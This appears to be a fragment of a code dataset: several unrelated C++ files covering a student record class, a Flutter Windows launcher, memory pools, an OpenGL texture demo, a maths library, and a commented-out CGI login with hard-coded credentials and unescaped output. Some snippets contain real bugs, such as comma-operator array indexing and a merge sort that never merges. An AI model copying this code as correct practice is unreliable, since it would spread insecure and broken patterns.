days_to_completion[class_num - 1] = num_days;\r\n}\r\n\r\nvoid Student::print() {\r\n    cout\r\n        << this->getId() << \" \\t\"\r\n        << \"First Name: \" << this->getFirstName() << \" \\t\"\r\n        << \" Last Name: \" << this->getLastName() << \" \\t\"\r\n        << \" Age: \" << this->getAge() << \" \\t\"\r\n        << \"daysInCourse: {\" << this->getCompletionDay(1) << \", \" << this->getCompletionDay(2) << \", \" << this->getCompletionDay(3) << \"} \"\r\n        << \"Degree Program: \" << this->getProgram() << std::endl;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"progetto_progmobile\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <mutex>\n#include <unordered_map>\n\n// Abstract base class for memory pool\nclass MemoryPool {\npublic:\n    virtual void* allocate(size_t size) = 0;\n    virtual void deallocate(void* ptr) = 0;\n    virtual ~MemoryPool() {}\n};\n\n// Simple memory pool with fixed-size blocks\nclass SimpleMemoryPool : public MemoryPool {\nprivate:\n    std::vector<char*> blocks;\n    size_t blockSize;\n    std::vector<void*> freeList;\n\npublic:\n    SimpleMemoryPool(size_t blockSize, size_t numBlocks) : blockSize(blockSize) {\n        // Allocate memory blocks\n        for (size_t i = 0; i < numBlocks; ++i) {\n            char* block = new char[blockSize];\n            blocks.push_back(block);\n            freeList.push_back(block);\n        }\n    }\n\n    ~SimpleMemoryPool() {\n        // Deallocate memory blocks\n        for (char* block : blocks) {\n            delete[] block;\n        }\n    }\n\n    void* allocate(size_t size) override {\n        if (size > blockSize) {\n            std::cerr << \"Requested size exceeds block size\" << std::endl;\n            return nullptr;\n        }\n\n        if (freeList.empty()) {\n            std::cerr << \"Memory pool is full\" << std::endl;\n            return nullptr;\n        }\n\n        void* ptr = freeList.back();\n        freeList.pop_back();\n        return ptr;\n    }\n\n    void deallocate(void* ptr) override {\n        freeList.push_back(ptr);\n    }\n};\n\n// Variable-size memory pool with custom allocator\nclass VariableSizeMemoryPool : public MemoryPool {\nprivate:\n    std::unordered_map<void*, size_t> allocations;\n    std::mutex mtx;\n\npublic:\n    VariableSizeMemoryPool() {}\n\n    ~VariableSizeMemoryPool() {}\n\n    void* allocate(size_t size) override {\n        void* ptr = malloc(size);\n        if (ptr) {\n            std::lock_guard<std::mutex> lock(mtx);\n            allocations[ptr] = size;\n        }\n        return ptr;\n    }\n\n    void deallocate(void* ptr) override {\n        if (!ptr) return;\n\n        std::lock_guard<std::mutex> lock(mtx);\n        auto it = allocations.find(ptr);\n        if (it != allocations.end()) {\n            free(ptr);\n            allocations.erase(it);\n        }\n    }\n\n    // Additional functions for memory tracking, debugging aids, and performance optimizations can be added here\n};\n\n// Singleton memory manager\nclass MemoryManager {\nprivate:\n    MemoryPool* memoryPool;\n    std::mutex mtx;\n\n    MemoryManager() : memoryPool(nullptr) {}\n\npublic:\n    static MemoryManager& getInstance() {\n        static MemoryManager instance;\n        return instance;\n    }\n\n    void setMemoryPool(MemoryPool* pool) {\n        std::lock_guard<std::mutex> lock(mtx);\n        memoryPool = pool;\n    }\n\n    void* allocate(size_t size) {\n        std::lock_guard<std::mutex> lock(mtx);\n        if (memoryPool) {\n            return memoryPool->allocate(size);\n        } else {\n            std::cerr << \"Memory pool is not set\" << std::endl;\n            return nullptr;\n        }\n    }\n\n    void deallocate(void* ptr) {\n        std::lock_guard<std::mutex> lock(mtx);\n        if (memoryPool) {\n            memoryPool->deallocate(ptr);\n        } else {\n            std::cerr << \"Memory pool is not set\" << std::endl;\n        }\n    }\n};\n\n// Custom class using memory manager\nclass CustomClass {\npublic:\n    void* operator new(size_t size) {\n        return MemoryManager::getInstance().allocate(size);\n    }\n\n    void operator delete(void* ptr) {\n        MemoryManager::getInstance().deallocate(ptr);\n    }\n};\n\nint main() {\n    // Example usage of memory pools\n    SimpleMemoryPool simplePool(1024, 10);\n    VariableSizeMemoryPool variablePool;\n\n    // Set the memory pool in the memory manager\n    MemoryManager::getInstance().setMemoryPool(&simplePool);\n\n    // Allocate and deallocate memory using custom class\n    CustomClass* obj1 = new CustomClass();\n    CustomClass* obj2 = new CustomClass();\n\n    delete obj1;\n    delete obj2;\n\n    // Set the memory pool to the variable-size pool\n    MemoryManager::getInstance().setMemoryPool(&variablePool);\n\n    // Allocate and deallocate memory using variable-size pool\n    void* ptr = MemoryManager::getInstance().allocate(100);\n    MemoryManager::getInstance().deallocate(ptr);\n\n    return 0;\n}\n",
    "\ufeff#include \"cgi.h\"\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <string.h>\n\nusing namespace cgi_utils;\nusing namespace std;\n\n/*/\nint main(){\n\tsetlocale(LC_ALL, \"rus\");\n\tcout << \"Content-type: text/html; charset=windows-1251\\n\\n\";\n\n\tifstream file(\"login.tmpl\");\n\tif (!file.is_open()) return -1;\n\n\tchar* line = new char[1024];\n\twhile (!file.eof())\n\t{\n\t\tfile.getline(line, 1024);\n\t\tif (!strcmp(line, \"<!--CONTENT-->\"))\n\t\t{\n\t\t\tcout << \"<div class='info'>\";\n\t\t\tcout << \"<p>Fill in the form</p>\";\n\t\t\tcout << \"<form method='post' action='index.cgi' class='login-form'>\\n\";\n\t\t\tcout << \"<input type=\\\"text\\\" name='user-name' placeholder=\\\"username\\\" required>\";\n\t\t\tcout << \"<input type=\\\"password\\\" name='passw' placeholder=\\\"Password\\\">\";\n\t\t\tcout << \"<input type=\\\"submit\\\" id='btn-submit' value=\\\"Sign In\\\"></form>\" << endl;\n\n\t\t\tif (get_request_method() == post)\n\t\t\t{\n\t\t\t\tchar* data = nullptr;\n\n\t\t\t\tget_form_data(data);\n\n\t\t\t\tchar* user_name = nullptr;\n\t\t\t\tchar* password = nullptr;\n\t\t\t\tconst char* filename = \"data.txt\";\n\n\t\t\t\tget_param_value(data, \"user-name\", user_name);\n\t\t\t\tget_param_value(data, \"passw\", password);\n\t\t\t\tif (user_name && password)\n\t\t\t\t{\n\t\t\t\t\tif (!strcmp(user_name, \"quan\") && !strcmp(password, \"q\"))\n\t\t\t\t\t{\n\t\t\t\t\t\tcout << \"<script>alert(Welcome, \" << user_name << \")</script>\";\n\t\t\t\t\t\tcout << \"<meta http-equiv='refresh' content='0;URL=profile.cgi'>\\n\";\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t\n\t\t\t\tcout << \"</div>\" << endl;\n\n\t\t\t\t// log all data to a file before cleaning\n\t\t\t\t//write_to_file_2(filename, 3, first_name, last_name, password);\n\t\t\t\tdelete[] data;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t\tcout << line << endl;\n\t}\n\tdelete[] line;\n\tfile.close();\n\treturn 0;\n}\n*/",
    "#include \"log_manager.h\"\n\n#include <sstream>\n\n/**\n * \u5f00\u542f\u65e5\u5fd7\u5237\u65b0\u7ebf\u7a0b\n */\nvoid LogManager::RunFlushThread() {\n    // Todo:\n    // 1. \u5982\u679c\u7cfb\u7edf\u672a\u5f00\u542f\u65e5\u5fd7\u529f\u80fd\uff0c\u5219\u4e0d\u80fd\u5f00\u542f\u65e5\u5fd7\u5237\u65b0\u7ebf\u7a0b\uff08\u901a\u8fc7log_mode_\u5224\u65ad\uff09\n    // 2. \u5f00\u542f\u4e00\u4e2a\u65b0\u7ebf\u7a0b\uff0c\u7528\u6765\u628aflush_buffer_\u4e2d\u7684\u5185\u5bb9\u5237\u65b0\u5230\u78c1\u76d8\u5f53\u4e2d\n    // 3. \u5728\u5237\u65b0\u4e4b\u524d\uff0c\u9700\u8981\u5224\u65ad\u5f53\u524d\u7ebf\u7a0b\u7531\u4e8e\u54ea\u79cd\u539f\u56e0\u88ab\u5524\u9192\uff0c\u5982\u679c\u662ftime_out\u5524\u9192\uff0c\u5219\u9700\u8981\u4ea4\u6362log_buffer\u548cflush_buffer\n    // 4.  \u5237\u65b0\u4e4b\u540e\u9700\u8981\u66f4\u65b0flush_buffer\u7684\u504f\u79fb\u91cf\u3001persistent_lsn_\u7b49\u4fe1\u606f\n\n}\n\n/**\n * \u8f85\u52a9\u51fd\u6570\uff0c\u7528\u4e8eDiskManager\u5524\u9192flush_thread_\n * @param p\n */\nvoid LogManager::WakeUpFlushThread(std::promise<void> *p) {\n    {\n        std::unique_lock<std::mutex> lock(latch_);\n        SwapBuffer();\n        SetPromise(p);\n    }\n\n    cv_.notify_one();\n\n    // waiting for flush_done\n    if (promise != nullptr) {\n        promise->get_future().wait();\n    }\n\n    SetPromise(nullptr);\n}\n\n/**\n * \u8f85\u52a9\u51fd\u6570\uff0c\u4ea4\u6362log_buffer_\u548cflush_buffer_\u53ca\u5176\u76f8\u5173\u4fe1\u606f\n */\nvoid LogManager::SwapBuffer() {\n    std::swap(log_buffer_, flush_buffer_);\n    std::swap(log_buffer_write_offset_, flush_buffer_write_offset_);\n    flush_lsn_ = next_lsn_ - 1;\n}\n\n/**\n * \u6dfb\u52a0\u4e00\u6761\u65e5\u5fd7\u8bb0\u5f55\u5230log_buffer_\u4e2d\n * @param log_record \u8981\u6dfb\u52a0\u7684\u65e5\u5fd7\u8bb0\u5f55\n * @return \u8fd4\u56de\u8be5\u65e5\u5fd7\u7684\u65e5\u5fd7\u5e8f\u5217\u53f7\n */\nlsn_t LogManager::AppendLogRecord(LogRecord *log_record) {\n    // Todo:\n    // 1. \u83b7\u53d6\u4e92\u65a5\u9501latch_\n    // 2. \u5224\u65adlog_buffer_\u4e2d\u662f\u5426\u8fd8\u5b58\u5728\u8db3\u591f\u7684\u5269\u4f59\u7a7a\u95f4\uff0c\u5982\u679c\u7a7a\u95f4\u4e0d\u8db3\uff0c\u9700\u8981\u4ea4\u6362log_buffer_\u548cflush_buffer_\uff0c\u5524\u9192\u65e5\u5fd7\u5237\u65b0\u7ebf\u7a0b\n    // 3. \u4e3a\u8be5\u65e5\u5fd7\u5206\u914d\u65e5\u5fd7\u5e8f\u5217\u53f7\n    // 4. \u628a\u8be5\u65e5\u5fd7\u5199\u5165\u5230log_buffer_\u4e2d\n\n    return log_record->lsn_;\n}",
    "//\n// Created by ivan on 2024/5/3.\n//\n#include <vector>\n#include <glad/glad.h>\n#include <glfw/glfw3.h>\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n#include <spdlog/spdlog.h>\n#include <Shader.hpp>\n#include <StbImage.hpp>\n\nconstexpr unsigned int WindowWidth = 800;\nconstexpr unsigned int WindowHeight = 600;\n\nstatic void framebuffer_size_callback(GLFWwindow* window, int width, int height);\nstatic void process_input(GLFWwindow *window);\n\nint main() {\n    spdlog::set_level(spdlog::level::debug);\n\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    GLFWwindow* window = glfwCreateWindow(WindowWidth, WindowHeight, \"Triangle\", nullptr, nullptr);\n    if (!window) {\n        spdlog::error(\"Failed to create GLFW window!\");\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)) {\n        spdlog::error(\"Failed to initialize GLAD!\");\n        return -1;\n    }\n\n    lgl::Shader shader;\n    shader.add(lgl::Shader::Type::Vertex, \"./vertexShader.glsl\");\n    shader.add(lgl::Shader::Type::Fragment, \"./fragShader.glsl\");\n    shader.link();\n\n    std::vector<float> vertices{\n        0.5f, 0.5f, 0.0f, 1.0f, 0.0f, 0.0f, 1.0f, 1.0f,\n        0.5f, -0.5f, 0.0f, 0.0f, 1.0f, 0.0f, 1.0f, 0.0f,\n        -0.5f, -0.5f, 0.0f, 0.0f, 0.0f, 1.0f, 0.0f, 0.0f,\n        -0.5f, 0.5f, 0.0f, 1.0f, 1.0f, 0.0f, 0.0f, 1.0f,\n    };\n    std::vector<unsigned int> indices = {\n        0, 1, 3,\n        1, 2, 3,\n    };\n\n    unsigned int vbo, vao, ebo;\n    glGenVertexArrays(1, &vao);\n    glGenBuffers(1, &vbo);\n    glGenBuffers(1, &ebo);\n\n    glBindVertexArray(vao);\n    glBindBuffer(GL_ARRAY_BUFFER, vbo);\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(*vertices.data()), vertices.data(), GL_STATIC_DRAW);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, ebo);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, indices.size() * sizeof(*indices.data()), indices.data(), GL_STATIC_DRAW);\n\n    auto posLoc = shader.get_attribute_location(\"aPos\");\n    glVertexAttribPointer(posLoc, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(*vertices.data()), (void *) 0);\n    glEnableVertexAttribArray(posLoc);\n    auto colorLoc = shader.get_attribute_location(\"aColor\");\n    glVertexAttribPointer(colorLoc, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(*vertices.data()), (void *) (3 * sizeof(*vertices.data())));\n    glEnableVertexAttribArray(colorLoc);\n    auto texCoordLoc = shader.get_attribute_location(\"aTexCoord\");\n    glVertexAttribPointer(texCoordLoc, 2, GL_FLOAT, GL_FALSE, 8 * sizeof(*vertices.data()), (void *) (6 * sizeof(*vertices.data())));\n    glEnableVertexAttribArray(texCoordLoc);\n\n    unsigned int texture1;\n    glGenTextures(1, &texture1);\n    glBindTexture(GL_TEXTURE_2D, texture1);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image1(\"../assets/container.jpg\");\n    spdlog::info(\"image1: width = {}, height = {}, channel = {}\", image1.width(), image1.height(), image1.channel());\n    if (image1()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, image1.width(), image1.height(), 0, GL_RGB, GL_UNSIGNED_BYTE, image1);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image1.release();\n\n    unsigned int texture2;\n    glGenTextures(1, &texture2);\n    glBindTexture(GL_TEXTURE_2D, texture2);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image2(\"../assets/awesomeface.png\", true);\n    spdlog::info(\"image2: width = {}, height = {}, channel = {}\", image2.width(), image2.height(), image2.channel());\n    if (image2()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, image2.width(), image2.height(), 0, GL_RGBA, GL_UNSIGNED_BYTE, image2);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image2.release();\n\n    shader.use();\n    glUniform1i(shader.get_uniform_location(\"uTexture1\"), 0);\n    glUniform1i(shader.get_uniform_location(\"uTexture2\"), 1);\n\n    while (!glfwWindowShouldClose(window)) {\n        process_input(window);\n\n        glClearColor(0.2f, 0.3f, 0.3f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT);\n\n        glActiveTexture(GL_TEXTURE0);\n        glBindTexture(GL_TEXT",
    "#include \"particle.h\"\r\n\r\n/*void Grid::AddParticle(particle* Particle)\r\n{\r\n\tint PrtX = Particle->getX(), PrtY = Particle->getY();\r\n\r\n\tif (ParticleCountArray[PrtX , PrtY] != 0)\r\n\t{\r\n\t\t//update the number of particles in the cell.\r\n\r\n\t\tParticleCountArray[ PrtX, PrtY] += 1;\r\n\r\n\t\t\r\n\t\t        | <--- screenWidth * 2 ---> |           __\r\n\t\t\t{ 0, null, 0, null, 0, null, 0, null        /\\\r\n\t\t\t, 0, null, 0, null, 0, null, 0, null   screenHeight\r\n\t\t    , 0, null, 0, null, 0, null, 0, null        \\/\r\n\t\t\t, 0, null, 0, null, 0, null, 0, null }      --\r\n\r\n\t\t//Updating the ID-Array array\r\n\r\n\t\tint* TempArr = new int[ParticleCountArray[PrtX, PrtY]];\r\n\t\tfor (int i = 0; i < ParticleCountArray[PrtX, PrtY] - 1; i++)\r\n\t\t{\r\n\t\t\tTempArr[i] = *(ParticleIdArrayArray[PrtX, PrtY] + i);\r\n\t\t\t//std::cout << *(ParticleIdArrayArray[PrtX, PrtY] + i) << \"\\n\";\r\n\t\t}\r\n\t\tTempArr[ParticleCountArray[PrtX, PrtY] - 1] = Particle->getID();\r\n\t\t//std::cout << Particle->getID() << \"was added \\n\";\r\n\r\n\t\tdelete ParticleIdArrayArray[PrtX, PrtY];\r\n\t\tParticleIdArrayArray[PrtX, PrtY] = TempArr;\r\n\t}\r\n\telse \r\n\t{\r\n\t\tParticleCountArray[PrtX , PrtY] += 1;\r\n\r\n\t\tint* TempPrt = new int[1] {Particle->getID()};\r\n\t\tParticleIdArrayArray[PrtX , PrtY] = TempPrt;\r\n\r\n\t\t//std::cout << \"new cell \\n\" << ParticleCountArray[PrtX, PrtY] << \" was added\\n\";\r\n\t}\r\n} */\r\n\r\nvoid Grid::SolveCollisionWithGrid(std::vector<VerletParticle*>& Group)\r\n{\r\n\tCell** TheIDGrid = new Cell*[GridWidth, GridHeight];\r\n\r\n\tfor (int x = 0; x < GridWidth; x++)\r\n\t{\r\n\t\tfor (int y = 0; y < GridHeight; y++)\r\n\t\t{\r\n\t\t\tTheIDGrid[x, y] = new Cell{};\r\n\t\t}\r\n\t}\r\n\r\n\t//Writing the IDs to the Array.\r\n\tfor (auto& Particle : Group)\r\n\t{\r\n\t\tTheIDGrid[\r\n\r\n\t\t\t(int)Particle->getX(), //x\r\n\t\t\t\t(int)Particle->getY() * GridWidth //y\r\n\r\n\t\t]->AddParticle(*Particle);\r\n\t}\r\n\r\n\t//Reading from the array//\r\n\tfor (int X = 1; X < GridWidth - 1; X++)\r\n\t{\r\n\t\tfor (int Y = 1; Y < GridHeight - 1; Y++)\r\n\t\t{\r\n\t\t\tCell* CurrentCell = TheIDGrid[X, Y];\r\n\t\t\tfor (int x = -1; x <= 1; x++)\r\n\t\t\t{\r\n\t\t\t\tfor (int y = -1; y <= 1; y++)\r\n\t\t\t\t{\r\n\t\t\t\t\tCell* NeighborCell = TheIDGrid[x, y];\r\n\t\t\t\t\tfor (int P1 = 0; P1 < CurrentCell->Count; P1++)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tfor (int P2 = 0; P2 < NeighborCell->Count; P2++)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tif ((*CurrentCell)[P1] != (*NeighborCell)[P2])\r\n\t\t\t\t\t\t\t\tVerletParticle::SolveCollision(*Group.at((*CurrentCell)[P1] - 1), *Group.at((*NeighborCell)[P2] - 1));\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tdelete[] TheIDGrid;\r\n}\r\n\r\nint* Helper::MergeSort::Merge(int* LeftArr, const int& LeftLength, int* RightArr, const int& RightLength)\r\n{\r\n\tint* FinalArr = new int[LeftLength + RightLength];\r\n\tint* LeftArrCounter = new int{ 0 }, * RightArrCounter = new int{ 0 };\r\n\r\n\tfor (size_t FinalArrCounter = 0; FinalArrCounter < LeftLength + RightLength; FinalArrCounter++)\r\n\t{\r\n\t\t//check if the right side has a bigger value\r\n\t\tif (LeftArr[*LeftArrCounter] >= RightArr[*RightArrCounter])\r\n\t\t{\r\n\t\t\tstd::cout << \"LeftSide chosen\";\r\n\t\t\t//write the left side to the next element.\r\n\t\t\tFinalArr[FinalArrCounter] = LeftArr[*LeftArrCounter];\r\n\t\t\t(*LeftArrCounter)++;\r\n\t\t\tstd::cout << \" \" << * LeftArrCounter << std::endl;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tstd::cout << \"RightSide chosen\";\r\n\t\t\tFinalArr[FinalArrCounter] = RightArr[*RightArrCounter];\r\n\t\t\t(*RightArrCounter)++;\r\n\t\t\tstd::cout << \" \" << * RightArrCounter << std::endl;\r\n\t\t}\r\n\t}\r\n\tdelete LeftArrCounter, RightArrCounter;\r\n\t \r\n\treturn FinalArr;\r\n\r\n\t/*\r\n\tint* FinalArr = new int[LeftLength + RightLength];\r\n\tint* RightCounter = new int{ 0 };\r\n\tint* FinalArrCounter = new int{ 0 };\r\n\r\n\tfor (int LeftCounter = 0; LeftCounter < LeftLength; LeftCounter++)\r\n\t{\r\n\t\t//check if the right array has a bigger value than the left side and loop undil it no longer is bigger.\r\n\t\twhile (RightArr[*RightCounter] > LeftArr[LeftCounter] && *RightCounter < RightLength)\r\n\t\t{\r\n\t\t\tFinalArr[*FinalArrCounter] = RightArr[*RightCounter];\r\n\t\t\t*RightCounter++;\r\n\t\t\t*FinalArrCounter++;\r\n\t\t}\r\n\r\n\t\tFinalArr[*FinalArrCounter] = LeftArr[LeftCounter];\r\n\t\t*FinalArrCounter++;\r\n\t}\r\n\t\r\n\r\n\tdelete[] LeftArr, RightArr;\r\n\tdelete RightCounter, FinalArrCounter;\r\n\treturn FinalArr;\r\n\t*/\r\n}\r\nvoid Helper::MergeSort::CopyArr(const int* ReadArr,const int& ReadFrom,int* WriteArr, const int& Length)\r\n{\r\n\tfor (size_t i = 0; i < Length; i++)\r\n\t{\r\n\t\tWriteArr[i] = ReadArr[ReadFrom + i];\r\n\t}\r\n}\r\nvoid Helper::MergeSort::MergeSort(int* OrigArr,const int& Length)\r\n{\r\n\t// check if there is only one element in the array.\r\n\tif (Length == 1) \r\n\t{\r\n\t\treturn;\r\n\t}\r\n\r\n\t//allocating memory for the two halves.\r\n\tint* LeftHalf = new int[Length / 2];\r\n\tint* RightHalf = new int[Length / 2 + Length % 2];\r\n\r\n\t//assigning the arrays with the values in the orignal array.\r\n\tHelper::MergeSort::CopyArr(OrigArr, 0, LeftHalf, Length / 2);\r\n\tHelper::MergeSort::CopyArr(OrigArr, Length / 2, RightHalf, Length / 2 + Length % 2);\r\n\r\n\t//sorting each half.\r\n\tHelper::MergeSort::MergeSort(LeftHalf, Length / 2);\r\n\tHelper::MergeSort::MergeSort(RightHalf, Length / 2 + Length % 2);\r\n\r\n\t//mergining the two halves.\r\n\r\n}\r\n\r\nint Helper::GenerateHash(c",
    "#include \"MathsLibrary.h\"\n#include <iostream>\n\nfloat MathsLibrary::PowerInt(float value, int power) {\n\tif (Approx(power, 0.f) || Approx(value,0.f)) {\n\t\treturn 1.f;\n\t}\n\tbool isPos = power > 0;\n\tint absolutePower;\n\tfloat multiplyIteration;\n\tif (isPos) {\n\t\tabsolutePower = power;\n\t\tmultiplyIteration = value;\n\t}\n\telse {\n\t\tabsolutePower = -power;\n\t\tmultiplyIteration = 1.f / value;\n\t}\n\n\tfloat beginningPoint = 1.f;\n\tfor (int Count = 0; Count < absolutePower; Count++) {\n\t\tbeginningPoint *= multiplyIteration;\n\t}\n\treturn beginningPoint;\n}\n\nfloat MathsLibrary::DecimalPower(float value, float decimalPower) {\n\n\treturn Exp(decimalPower * Log(value));\n}\n\n//ASSUMING VALUE IS BETWEEN 0 AND 1\nconstexpr int ACCURACY{ 6 };\nconstexpr float e{ 2.71828182845f };\nfloat MathsLibrary::ExpCore(float value)\n{\n\t//simd?\n\tfloat total = 0.f;\n\tint totalDivider = 1;\n\tfloat iteratorMultiply = 1.f;\n\tfloat valueToMultiplyBy = value > 0.55 ? value - 1 : value;\n\tfor (int Count = 0; Count < ACCURACY; Count++) {\n\t\tif (Count > 0) {\n\t\t\ttotalDivider *= Count;\n\t\t}\n\t\tfloat thisTotal = iteratorMultiply / (float)(totalDivider);\n\t\titeratorMultiply *= valueToMultiplyBy;\n\t\ttotal += thisTotal;\n\t}\n\treturn value > 0.55 ? total * e : total;\n}\n\nfloat MathsLibrary::totalTaylorSeries__DivisionPrecalculated(float value, float taylor_values[ACCURACY])\n{\n\tfloat startingMultiplicationVal = 1.f;\n\tfloat total = 0.f;\n\tfor (int Count = 0; Count < ACCURACY; Count++) {\n\t\ttotal += taylor_values[Count] * startingMultiplicationVal;\n\t\tstartingMultiplicationVal *= value;\n\t}\n\treturn total;\n}\n\nfloat MathsLibrary::totalTaylorSeries__DivisionPrecalculated(float value, float* taylor_values, int size)\n{\n\tfloat startingMultiplicationVal = 1.f;\n\tfloat total = 0.f;\n\tfor (int Count = 0; Count < size; Count++) {\n\t\ttotal += taylor_values[Count] * startingMultiplicationVal;\n\t\tstartingMultiplicationVal *= value;\n\t}\n\treturn total;\n}\n\nint MathsLibrary::ClosestTwoPowerN(float value)\n{\n\tfloat_cast currentFloat = float_cast();\n\tcurrentFloat.f = value;\n\treturn (int)currentFloat.parts.exponent - 127;\n}\n\nfloat MathsLibrary::DividedByClosestPowerOfTwo(float value)\n{\n\tfloat_cast currentFloat = float_cast();\n\tcurrentFloat.f = value;\n\tif (currentFloat.parts.mantisa == 0) {\n\t\treturn 0.f;\n\t}\n\tcurrentFloat.parts.exponent = 127;\n\treturn currentFloat.f;\n}\n\n\n#define LOG_ACCURACY_SERIES 5\nfloat MathsLibrary::FindLnValueBetween1And2(float value)\n{\n\n\tif (value < 1.5f) {\n\t\tfloat excess = value - 1.f;\n\t\tfloat total = 0.f;\n\t\tfloat powerResult = 1.f;\n\t\tfor (int Count = 1; Count < LOG_ACCURACY_SERIES + 1; Count++) {\n\t\t\t//if count is even\n\t\t\tint multiplyBy = Count % 2 == 1 ? 1 : -1;\n\t\t\tpowerResult *= excess;\n\t\t\tfloat thisIterationValue = powerResult * (float)multiplyBy / (float)Count;\n\t\t\ttotal += thisIterationValue;\n\t\t}\n\t\treturn total;\n\t}\n\n\telse {\n\t\tfloat newVal = value - 2.f;\n\t\tfloat VALUES_LIST[7] = {0.6931471806f,0.5f,-0.125f,0.0416416416f,-0.015625f, 6.25e-3,-2.6041667e-3 };\n\t\treturn totalTaylorSeries__DivisionPrecalculated(newVal, VALUES_LIST,7);\n\t}\n\n}",
    "/*\n * Copyright (c) 2018, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n * */\n\n#include \"aacEncode.h\"\n#include \"aacenc_lib.h\"\n#include <utils/Log.h>\n#include <string.h>\n\nstruct aacInfo\n{\n    AACENC_BufDesc inBuff;\n    AACENC_BufDesc outBuff;\n    AACENC_InArgs  inArg;\n    AACENC_OutArgs outArg;\n};\n\naacEncode::aacEncode() {\n  